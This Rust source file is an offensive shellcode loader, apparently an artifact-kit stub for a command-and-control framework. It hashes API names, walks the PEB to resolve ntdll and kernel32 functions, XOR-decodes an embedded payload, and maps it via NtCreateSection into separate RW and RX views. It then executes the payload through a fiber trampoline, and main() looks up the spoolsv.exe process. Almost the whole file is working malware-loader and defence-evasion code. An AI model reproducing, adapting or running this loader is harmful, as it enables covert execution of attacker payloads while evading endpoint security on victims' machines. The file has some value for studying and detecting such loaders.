#![cfg_attr(not(feature = "stable"), feature(asm))]

use std::{
    mem::size_of,
    ptr::null_mut,
    ffi::c_void,
    arch::asm,
    slice::from_raw_parts,
};

use windows_sys::Win32::{
    Foundation::{CloseHandle, FALSE, HANDLE, HMODULE, MAX_PATH, TRUE, INVALID_HANDLE_VALUE},
    System::{
        Diagnostics::ToolHelp::{
            CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32,
            TH32CS_SNAPPROCESS,
        },
        Threading::{
            GetCurrentProcessId, OpenProcess, UpdateProcThreadAttribute,
            InitializeProcThreadAttributeList, DeleteProcThreadAttributeList,
            PROCESS_ALL_ACCESS, PROCESS_INFORMATION, STARTUPINFOEXW, 
            WaitForSingleObject, ResumeThread,
            CREATE_SUSPENDED, EXTENDED_STARTUPINFO_PRESENT,
        },
    },
};
use std::sync::LazyLock;
use std::ptr::addr_of_mut;


#[allow(unused_variables)]
#[allow(unused_assignments)]

// Type aliases for missing types
type PVOID = *mut c_void;
type ULONG = u32;
type ULONG_PTR = usize;
type SIZE_T = usize;
type PSIZE_T = *mut SIZE_T;
type DWORD = u32;
type BOOLEAN = u8;

// Constants
type ACCESS_MASK = u32;
const THREAD_ALL_ACCESS: u32 = 0x1FFFFF;
const IMAGE_DOS_SIGNATURE: u16 = 0x5A4D; // "MZ"
const IMAGE_NT_SIGNATURE: u32 = 0x00004550; // "PE\0\0"
const IMAGE_DIRECTORY_ENTRY_EXPORT: usize = 0;


#[inline(always)]
pub const fn hash_bytes(bytes: &[u8]) -> u32 {
    // djb2 (with wrapping to avoid UB on overflow)
    let mut h: u32 = 0x1505;
    let mut i = 0;
    while i < bytes.len() {
        h = h.wrapping_mul(33).wrapping_add(bytes[i] as u32);
        i += 1;
    }
    h
}

// If you also want a runtime helper for &str:
#[inline(always)]
pub fn hash_str(s: &str) -> u32 {
    hash_bytes(s.as_bytes())
}

type LPVOID = PVOID;
type NTSTATUS = i32;

// Fiber start routine signature
type LPFIBER_START_ROUTINE = Option<unsafe extern "system" fn(LPVOID)>;

// Kernel32 Fiber API typedefs
type ConvertThreadToFiber = unsafe extern "system" fn(LPVOID) -> LPVOID;
type CreateFiber = unsafe extern "system" fn(SIZE_T, LPFIBER_START_ROUTINE, LPVOID) -> LPVOID;
type SwitchToFiber = unsafe extern "system" fn(LPVOID);
type DeleteFiber = unsafe extern "system" fn(LPVOID);
// === Function typedefs ===
type NtCreateSection = unsafe extern "system" fn(
    SectionHandle: *mut HANDLE,
    DesiredAccess: u32,
    ObjectAttributes: PVOID,       // optional
    MaximumSize: *mut LARGE_INTEGER,
    SectionPageProtection: u32,
    AllocationAttributes: u32,
    FileHandle: HANDLE
) -> NTSTATUS;

type NtMapViewOfSection = unsafe extern "system" fn(
    SectionHandle: HANDLE,
    ProcessHandle: HANDLE,
    BaseAddress: *mut PVOID,
    ZeroBits: ULONG_PTR,
    CommitSize: SIZE_T,
    SectionOffset: *mut LARGE_INTEGER,
    ViewSize: *mut SIZE_T,
    InheritDisposition: u32,
    AllocationType: u32,
    Win32Protect: u32
) -> NTSTATUS;

type NtUnmapViewOfSection = unsafe extern "system" fn(
    ProcessHandle: HANDLE,
    BaseAddress: PVOID
) -> NTSTATUS;

// Compile-time API hashing
pub const HASH_NTALLOCATEVIRTUALMEMORY: u32 = hash_bytes(b"NtAllocateVirtualMemory");
pub const HASH_NTWRITEVIRTUALMEMORY:  u32 = hash_bytes(b"NtWriteVirtualMemory");
pub const HASH_RTLCREATEUSERTHREAD:   u32 = hash_bytes(b"RtlCreateUserThread");
pub const HASH_NTCREATEUSERPROCESS:   u32 = hash_bytes(b"NtCreateUserProcess");
pub const HASH_NTCREATEPROCESSEX:     u32 = hash_bytes(b"NtCreateProcessEx");
pub const HASH_NTCREATETHREADEX: u32 = hash_bytes(b"NtCreateThreadEx");
pub const HASH_NTCREATEPROCESS: u32 = hash_bytes(b"NtCreateProcess");
pub const HASH_NTCREATESECTION: u32 = hash_bytes(b"NtCreateSection");
pub const HASH_NTMAPVIEWOFSECTION: u32 = hash_bytes(b"NtMapViewOfSection");
const HASH_NTRESUMETHREAD: u32 = hash_bytes(b"NtResumeThread");
const HASH_NTPROTECTVIRTUALMEMORY: u32 = hash_bytes(b"NtProtectVirtualMemory");
pub const HASH_NTDLL: u32 = hash_bytes(b"ntdll.dll");
const HASH_KERNEL32: u32 = hash_bytes(b"kernel32.dll");
const HASH_CONVERTTHREADTOFIBER: u32 = hash_bytes(b"ConvertThreadToFiber");
const HASH_CREATEFIBER: u32 = hash_bytes(b"CreateFiber");
const HASH_SWITCHTOFIBER: u32 = hash_bytes(b"SwitchToFiber");
const HASH_DELETEFIBER: u32 = hash_bytes(b"DeleteFiber");
// Payload structure
const MARKER_LEN: usize = 1024;   // how many 'A's your CNA looks for
const PAYLOAD_BUF: usize = 447702;

// === Memory allocation constants ===
const PAGE_NOACCESS:        u32 = 0x01;
const PAGE_READONLY:        u32 = 0x02;
const PAGE_READWRITE:       u32 = 0x04;
const PAGE_WRITECOPY:       u32 = 0x08;
const PAGE_EXECUTE:         u32 = 0x10;
const PAGE_EXECUTE_READ:    u32 = 0x20;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const PAGE_EXECUTE_WRITECOPY: u32 = 0x80;
const SECTION_ALL_ACCESS: u32 = 0xF001F;


// For NtMapViewOfSection
const ViewShare: u32 = 1;
const ViewUnmap: u32 = 2;

// === Allocation types ===
const MEM_COMMIT:  u32 = 0x1000;
const SEC_COMMIT: u32 = 0x08000000;
const MEM_RESERVE: u32 = 0x2000;
const MEM_RELEASE: u32 = 0x8000;

// === Types & Structs ===
#[repr(C)]
pub struct LARGE_INTEGER {
    pub QuadPart: i64,
}

#[repr(C)]
pub struct Phear {
    pub offset: i32,
    pub length: i32,
    pub key: [u8; 8],
    pub gmh_offset: i32,
    pub gpa_offset: i32,
    pub payload: [u8; 447702],
}

// Just fill the whole thing with 'A' so CNA can patch it
static DATA: [u8; std::mem::size_of::<Phear>()] = [b'A'; std::mem::size_of::<Phear>()];


// API hashing function
fn hash_string(string: &str) -> u32 {
    let mut hash: u32 = 0x1505;
    for byte in string.bytes() {
        hash = ((hash << 5) + hash) + byte as u32;
    }
    hash
}

// Get module handle by hash
unsafe fn get_module_handle_by_hash(hash: u32) -> Option<HMODULE> {
    println!("[DEBUG] Looking for module with hash: 0x{:08X}", hash);

    let peb = get_peb();
    println!("[DEBUG] PEB address: {:p}", peb);

    if peb.is_null() {
        println!("[DEBUG] PEB is null!");
        return None;
    }

    // Get PEB_LDR_DATA
    let ldr = *(peb.add(0x18) as *const *const u8);
    println!("[DEBUG] LDR address: {:p}", ldr);

    if ldr.is_null() {
        println!("[DEBUG] LDR is null!");
        return None;
    }

    // InLoadOrderModuleList
    let list_head = ldr.add(0x10);
    println!("[DEBUG] List head: {:p}", list_head);

    let mut current = *(list_head as *const *const u8);
    println!("[DEBUG] First module: {:p}", current);

    let mut iterations = 0;
    let max_iterations = 64;

    while !current.is_null() && current != list_head && iterations < max_iterations {
        iterations += 1;

        println!("[DEBUG] Iteration {} - Current: {:p}", iterations, current);

        // DllBase (offset 0x30)
        let base = *(current.add(0x30) as *const HMODULE);
        println!("[DEBUG]   Module base: {:p}", base);

        // UNICODE_STRING BaseDllName at offset 0x58
        let unicode_str_ptr = current.add(0x58);
        let name_length = *(unicode_str_ptr as *const u16);
        let name_buffer = *(unicode_str_ptr.add(8) as *const *const u16);

        if name_buffer.is_null() || name_length == 0 {
            println!("[DEBUG]   Invalid name buffer, skipping");
            current = *(current as *const *const u8);
            continue;
        }

        // Convert to UTF-16 string
        let char_count = (name_length / 2) as usize;
        let mut base_name_utf16 = Vec::with_capacity(char_count);
        for i in 0..char_count.min(256) {
            base_name_utf16.push(*name_buffer.add(i));
        }

        if let Ok(full_name) = String::from_utf16(&base_name_utf16) {
            // Strip path → just filename
            let lower_name = full_name.rsplit('\\').next().unwrap_or(&full_name).to_lowercase();
            let current_hash = hash_bytes(lower_name.as_bytes());

            println!("[DEBUG]   Module: {} -> Hash: 0x{:08X}", lower_name, current_hash);

            if current_hash == hash {
                println!("[DEBUG] Found matching module: {}", lower_name);
                return Some(base);
            }
        }

        // Flink (next entry)
        current = *(current as *const *const u8);
    }

    if iterations >= max_iterations {
        println!("[DEBUG] Hit max iterations ({})", max_iterations);
    }

    None
}



// Get PEB address
unsafe fn get_peb() -> *const u8 {
    #[cfg(target_arch = "x86_64")]
    {
        let peb: *const u8;
        asm!(
            "mov {}, gs:[0x60]",
            out(reg) peb,
            options(nostack, pure, nomem)
        );
        println!("[DEBUG] PEB from gs:[0x60]: {:p}", peb);
        peb
    }
    #[cfg(target_arch = "x86")]
    {
        let peb: *const u8;
        asm!(
            "mov {}, fs:[0x30]",
            out(reg) peb,
            options(nostack, pure, nomem)
        );
        println!("[DEBUG] PEB from fs:[0x30]: {:p}", peb);
        peb
    }
}

// Get proc address by hash
unsafe fn get_proc_address_by_hash(module: HMODULE, hash: u32) -> Option<*const c_void> {
    let dos_header = module as *const IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
        return None;
    }

    let nt_headers =
        (module as usize + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS;
    if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
        return None;
    }

    let export_dir_rva =
        (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    let export_dir_size =
        (*nt_headers).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

    if export_dir_rva == 0 {
        return None;
    }

    let export_dir =
        (module as usize + export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY;

    let names =
        (module as usize + (*export_dir).AddressOfNames as usize) as *const u32;
    let functions =
        (module as usize + (*export_dir).AddressOfFunctions as usize) as *const u32;
    let ordinals =
        (module as usize + (*export_dir).AddressOfNameOrdinals as usize) as *const u16;

    for i in 0..(*export_dir).NumberOfNames {
        let name_rva = *names.add(i as usize);
        let name_ptr = (module as usize + name_rva as usize) as *const u8;

        let mut name = Vec::new();
        let mut j = 0;
        while j < 256 && *name_ptr.add(j) != 0 {
            name.push(*name_ptr.add(j));
            j += 1;
        }

        if let Ok(name_str) = String::from_utf8(name) {
            if hash_bytes(name_str.as_bytes()) == hash {
                let ordinal = *ordinals.add(i as usize);
                if ordinal as u32 >= (*export_dir).NumberOfFunctions {
                    continue;
                }

                let func_rva = *functions.add(ordinal as usize);

                // ---- Forwarded export check ----
                if func_rva >= export_dir_rva && func_rva < export_dir_rva + export_dir_size {
                    let forward_str_ptr =
                        (module as usize + func_rva as usize) as *const i8;
                    let forward_str = std::ffi::CStr::from_ptr(forward_str_ptr)
                        .to_string_lossy()
                        .into_owned();
                    println!("[!] Forwarded export: {}", forward_str);

                    if let Some((dll_name, func_name)) = forward_str.split_once('.') {
                        let dll_file = format!("{}.dll", dll_name.to_lowercase());

                        // Walk PEB to resolve this DLL base (no LoadLibrary)
                        if let Some(fwd_mod) = get_module_handle_by_hash(hash_bytes(dll_file.as_bytes())) {
                            let fwd_hash = hash_bytes(func_name.as_bytes());
                            return get_proc_address_by_hash(fwd_mod, fwd_hash);
                        } else {
                            println!("[!] Could not find forwarder module: {}", dll_file);
                            return None;
                        }
                    }
                    continue;
                }

                // ---- Normal export ----
                let func_addr =
                    (module as usize + func_rva as usize) as *const c_void;
                return Some(func_addr);
            }
        }
    }

    None
}

// Get PID by process name
fn get_pid_by_process_name(process_name: &str) -> Option<DWORD> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == INVALID_HANDLE_VALUE  {
            return None;
        }
        
        let mut process_entry: PROCESSENTRY32 = std::mem::zeroed();
        process_entry.dwSize = size_of::<PROCESSENTRY32>() as DWORD;
        
        if Process32First(snapshot, &mut process_entry) == TRUE {
            loop {
                let name = std::ffi::CStr::from_ptr(process_entry.szExeFile.as_ptr() as *const i8)
                    .to_string_lossy()
                    .into_owned();
                
                if name.to_lowercase() == process_name.to_lowercase() {
                    CloseHandle(snapshot);
                    return Some(process_entry.th32ProcessID);
                }
                
                if Process32Next(snapshot, &mut process_entry) != TRUE {
                    break;
                }
            }
        }
        
        CloseHandle(snapshot);
        None
    }
}

unsafe fn detect_patch_state() {
    let phear = &*(DATA.as_ptr() as *const Phear);

    let length = phear.length as usize;

    if length == 1024 {
        println!("[!] Running RAW STUB (unpatched) – placeholder payload");
    } else if length > 1024 && length < phear.payload.len() {
        println!("[+] CNA PATCH DETECTED – payload length: {} bytes", length);
    } else {
        println!("[?] Invalid payload length ({}) – corruption or mismatch?", length);
    }
}

// Execute artifact in current process using Section Mapping + Fiber trampoline
unsafe fn exec_artifact(_ex_pid: DWORD) -> Result<(), Box<dyn std::error::Error>> {
    println!("[+] Executing artifact kit buffer using Section Mapping + Fiber trampoline");

    // Interpret embedded DATA as Phear struct
    let phear: &Phear = &*(DATA.as_ptr() as *const Phear);

    if phear.length <= 0 {
        return Err("Artifact not patched".into());
    }

    let mut length = phear.length as usize;
    if length == 0 || length > phear.payload.len() {
        println!("[!] Invalid payload length {}, clamping", length);
        length = phear.payload.len();
    }

    println!("[+] Payload length: {}", length);

    // === 1. Decode payload ===
    let mut decrypted = Vec::with_capacity(length);
    for i in 0..length {
        decrypted.push(phear.payload[i] ^ phear.key[i % 8]);
    }

    // === 2. Resolve NTDLL APIs ===
    let h_ntdll = get_module_handle_by_hash(HASH_NTDLL).ok_or("Failed to resolve ntdll.dll")?;

    let create_section: NtCreateSection = std::mem::transmute(
        get_proc_address_by_hash(h_ntdll, HASH_NTCREATESECTION).ok_or("NtCreateSection not found")?,
    );
    let map_view: NtMapViewOfSection = std::mem::transmute(
        get_proc_address_by_hash(h_ntdll, HASH_NTMAPVIEWOFSECTION).ok_or("NtMapViewOfSection not found")?,
    );

    // === 3. Create section ===
    let mut section_handle: HANDLE = std::ptr::null_mut();
    let mut max_size = LARGE_INTEGER { QuadPart: decrypted.len() as i64 };

    let status = create_section(
        &mut section_handle,
        SECTION_ALL_ACCESS,
        std::ptr::null_mut(),
        &mut max_size as *mut _,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        std::ptr::null_mut(),
    );
    if status != 0 {
        return Err(format!("NtCreateSection failed: 0x{:X}", status).into());
    }

    // === 4. Map RW view ===
    let mut rw_base: PVOID = std::ptr::null_mut();
    let mut view_size: usize = 0;
    let status = map_view(
        section_handle,
        -1isize as HANDLE,
        &mut rw_base,
        0,
        decrypted.len(),
        std::ptr::null_mut(),
        &mut view_size,
        ViewUnmap,
        0,
        PAGE_READWRITE,
    );
    if status != 0 {
        return Err(format!("NtMapViewOfSection (RW) failed: 0x{:X}", status).into());
    }

    // === 5. Copy shellcode into RW view ===
    std::ptr::copy_nonoverlapping(decrypted.as_ptr(), rw_base as *mut u8, decrypted.len());

    // === 6. Remap RX view ===
    let mut rx_base: PVOID = std::ptr::null_mut();
    let mut exec_size: usize = 0;
    let status = map_view(
        section_handle,
        -1isize as HANDLE,
        &mut rx_base,
        0,
        decrypted.len(),
        std::ptr::null_mut(),
        &mut exec_size,
        ViewUnmap,
        0,
        PAGE_EXECUTE_READ,
    );
    if status != 0 {
        return Err(format!("NtMapViewOfSection (RX) failed: 0x{:X}", status).into());
    }

    println!("[+] Section mapped. RW base = {:p}, RX base = {:p}", rw_base, rx_base);

    // === 7. Fiber trampoline ===
    println!("[+] Resolving Fiber APIs from kernel32.dll");
    let h_kernel32 = get_module_handle_by_hash(HASH_KERNEL32).ok_or("Failed to resolve kernel32.dll")?;

    let convert_thread_to_fiber: ConvertThreadToFiber =
        std::mem::transmute(get_proc_address_by_hash(h_kernel32, HASH_CONVERTTHREADTOFIBER).ok_or("ConvertThreadToFiber not found")?);

    let create_fiber: CreateFiber =
        std::mem::transmute(get_proc_address_by_hash(h_kernel32, HASH_CREATEFIBER).ok_or("CreateFiber not found")?);

    let switch_to_fiber: SwitchToFiber =
        std::mem::transmute(get_proc_address_by_hash(h_kernel32, HASH_SWITCHTOFIBER).ok_or("SwitchToFiber not found")?);

    let delete_fiber: DeleteFiber =
        std::mem::transmute(get_proc_address_by_hash(h_kernel32, HASH_DELETEFIBER).ok_or("DeleteFiber not found")?);

    // Convert thread → fiber
    let main_fiber = convert_thread_to_fiber(std::ptr::null_mut());
    if main_fiber.is_null() {
        return Err("ConvertThreadToFiber failed".into());
    }

    // Fiber entry = mapped RX shellcode
    let shell_fiber = create_fiber(0, Some(std::mem::transmute(rx_base)), std::ptr::null_mut());
    if shell_fiber.is_null() {
        return Err("CreateFiber failed".into());
    }

    println!("[+] Switching to shellcode fiber...");
    switch_to_fiber(shell_fiber);

    // Cleanup
    delete_fiber(shell_fiber);

    Ok(())
}



fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("[+] Starting shellcode loader with Hell's Gate");
    
    // Get spoolsv.exe PID
    let pid = match get_pid_by_process_name("spoolsv.exe") {
        Some(pid) => {
            println!("[+] Retrieving spoolsv PID: {}", pid);
            pid
        }
        None => return Err("Failed to find spoolsv.exe process".into()),
    };
    
    // Execute the artifact
    unsafe {
        if let Err(e) = exec_artifact(pid) {
            eprintln!("[-] Error: {}", e);
            return Err(e);
        }
    }
    
    println!("[+] Press Enter to exit...");
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).unwrap();
    Ok(())
}

// PE structures for parsing
#[repr(C)]
struct IMAGE_DOS_HEADER {
    e_magic: u16,
    e_cblp: u16,
    e_cp: u16,
    e_crlc: u16,
    e_cparhdr: u16,
    e_minalloc: u16,
    e_maxalloc: u16,
    e_ss: u16,
    e_sp: u16,
    e_csum: u16,
    e_ip: u16,
    e_cs: u16,
    e_lfarlc: u16,
    e_ovno: u16,
    e_res: [u16; 4],
    e_oemid: u16,
    e_oeminfo: u16,
    e_res2: [u16; 10],
    e_lfanew: i32,
}

#[repr(C)]
struct IMAGE_NT_HEADERS {
    Signature: u32,
    FileHeader: IMAGE_FILE_HEADER,
    OptionalHeader: IMAGE_OPTIONAL_HEADER,
}

#[repr(C)]
struct IMAGE_FILE_HEADER {
    Machine: u16,
    NumberOfSections: u16,
    TimeDateStamp: u32,
    PointerToSymbolTable: u32,
    NumberOfSymbols: u32,
    SizeOfOptionalHeader: u16,
    Characteristics: u16,
}

#[repr(C)]
struct IMAGE_OPTIONAL_HEADER {
    Magic: u16,
    MajorLinkerVersion: u8,
    MinorLinkerVersion: u8,
    SizeOfCode: u32,
    SizeOfInitializedData: u32,
    SizeOfUninitializedData: u32,
    AddressOfEntryPoint: u32,
    BaseOfCode: u32,
    ImageBase: u64,
    SectionAlignment: u32,
    FileAlignment: u32,
    MajorOperatingSystemVersion: u16,
    MinorOperatingSystemVersion: u16,
    MajorImageVersion: u16,
    MinorImageVersion: u16,
    MajorSubsystemVersion: u16,
    MinorSubsystemVersion: u16,
    Win32VersionValue: u32,
    SizeOfImage: u32,
    SizeOfHeaders: u32,
    CheckSum: u32,
    Subsystem: u16,
    DllCharacteristics: u16,
    SizeOfStackReserve: u64,
    SizeOfStackCommit: u64,
    SizeOfHeapReserve: u64,
    SizeOfHeapCommit: u64,
    LoaderFlags: u32,
    NumberOfRvaAndSizes: u32,
    DataDirectory: [IMAGE_DATA_DIRECTORY; 16],
}

#[repr(C)]
struct IMAGE_DATA_DIRECTORY {
    VirtualAddress: u32,
    Size: u32,
}

#[repr(C)]
struct IMAGE_EXPORT_DIRECTORY {
    Characteristics: u32,
    TimeDateStamp: u32,
    MajorVersion: u16,
    MinorVersion: u16,
    Name: u32,
    Base: u32,
    NumberOfFunctions: u32,
    NumberOfNames: u32,
    AddressOfFunctions: u32,
    AddressOfNames: u32,
    AddressOfNameOrdinals: u32,
}
